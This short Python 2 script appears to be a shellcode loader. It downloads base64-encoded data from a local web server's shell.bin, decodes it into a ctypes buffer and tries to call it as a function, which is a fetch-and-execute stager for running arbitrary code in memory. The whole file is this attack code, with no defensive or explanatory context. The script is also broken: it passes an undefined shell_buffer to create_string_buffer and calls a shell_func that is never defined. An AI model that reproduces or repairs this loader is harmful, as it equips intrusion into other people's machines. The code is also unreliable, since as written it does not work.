import urllib2
import ctypes
import base64

url = "http://127.0.0.1:8000/shell.bin"
response = urllib2.urlopen(url)

shell = base64.b64decode(response.read())

shell_buffer = ctypes.create_string_buffer(
    shell_buffer,
    ctypes.CFUNCTYPE(ctypes.c_void_p)
)

shell_func()
